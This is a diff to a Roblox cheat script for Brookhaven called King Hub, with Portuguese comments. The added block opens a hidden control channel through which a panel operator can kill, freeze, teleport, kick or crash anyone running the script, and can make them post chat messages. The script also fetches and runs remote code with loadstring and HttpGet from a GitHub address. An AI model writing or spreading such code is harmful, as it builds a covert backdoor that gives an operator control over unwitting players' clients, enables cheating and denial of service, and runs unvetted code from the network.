@@ -1,3 +1,85 @@
+-- =================================================================
+-- CONFIGURAÇÃO DO CANAL DE COMUNICAÇÃO PRIVADA (OUVINTE/OBEDIÊNCIA)
+-- Este código DEVE ir no seu script King Hub (Redz Lib)
+-- =================================================================
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- 1. Cria ou Referencia o RemoteEvent "KingHubControl"
+local PrivateRemote = ReplicatedStorage:FindFirstChild("KingHubControl")
+if not PrivateRemote then
+    PrivateRemote = Instance.new("RemoteEvent")
+    PrivateRemote.Name = "KingHubControl"
+    PrivateRemote.Parent = ReplicatedStorage
+end
+
+-- 2. FUNÇÃO QUE ESCUTA OS COMANDOS REMOTOS
+PrivateRemote.OnClientEvent:Connect(function(command, targetPlayerName, commandValue)
+    
+    -- Verifica se o comando é para "ALL" ou para este jogador
+    if targetPlayerName == "ALL" or targetPlayerName == LocalPlayer.Name then
+        
+        -- Garante que o Humanoid (corpo) esteja carregado para a maioria das ações
+        local Humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
+        local HRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        
+        -- =================================================================
+        -- COMANDOS DE AÇÃO
+        -- =================================================================
+
+        if command == "Kill" then
+            if Humanoid then
+                Humanoid.Health = 0
+            end
+        
+        elseif command == "Freeze" then
+            if HRP then
+                HRP.Anchored = true -- Congela a posição
+                if Humanoid then Humanoid.WalkSpeed = 0 end
+            end
+            
+        elseif command == "Unfreeze" then
+            if HRP then
+                HRP.Anchored = false -- Descongela a posição
+                if Humanoid then Humanoid.WalkSpeed = 16 end -- Volta à velocidade padrão
+            end
+            
+        elseif command == "Bring" then
+            local adminCFrame = commandValue -- CFrame do Admin enviada pelo Painel
+            if HRP and adminCFrame then
+                -- Teleporta o alvo para a posição do Admin
+                HRP.CFrame = adminCFrame
+            end
+            
+        elseif command == "SayMessage" then
+            local message = commandValue -- Mensagem enviada pelo Painel
+            if message and Players:FindFirstChild("ChatServiceRunner") then
+                -- Força o player a dizer algo no chat
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+            end
+
+        elseif command == "Kick" then
+            -- Ação de Kick/Chute (Só funcionará se o script tiver uma backdoor no servidor)
+            -- Como é cliente-side, a chance de funcionar é baixa, mas o comando está configurado.
+            LocalPlayer:Kick("Você foi expulso pelo Painel de Administração King Hub.")
+
+        elseif command == "Crash" then
+            -- Ação de Crash (Geralmente envolve loop infinito ou consumo de memória)
+            -- Exemplo simples de sobrecarga de memória (Pode não funcionar dependendo do exploit/jogo):
+            local crashTable = {}
+            for i = 1, 1000000 do
+                table.insert(crashTable, string.rep("A", 1000))
+            end
+            -- Aviso: Implementações de crash variam muito e podem ser instáveis.
+            
+        -- Adicione qualquer outro comando que você criar no seu painel aqui!
+        
+        end
+    end
+end)
+
 if game.PlaceId ~= 4924922222 then
     return print("Este script só funciona no Brookhaven.")
 end
@@ -22,4 +104,4 @@ local redzlib=loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143
       end}
     }
   })
-         
+      redzlib:SetTheme("Purple")      
